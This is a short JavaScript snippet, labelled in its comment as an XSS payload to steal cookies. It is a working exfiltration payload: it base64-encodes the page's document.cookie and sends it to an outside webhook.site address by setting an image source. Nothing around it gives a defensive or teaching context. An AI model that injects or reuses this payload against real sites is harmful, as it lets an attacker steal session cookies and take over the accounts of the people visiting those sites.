// XSS Payload to steal cookies
var img = new Image();
img.src = 'https://webhook.site/859d5d01-1925-4b02-8d12-0ecce351db5e?data=' + btoa(document.cookie);
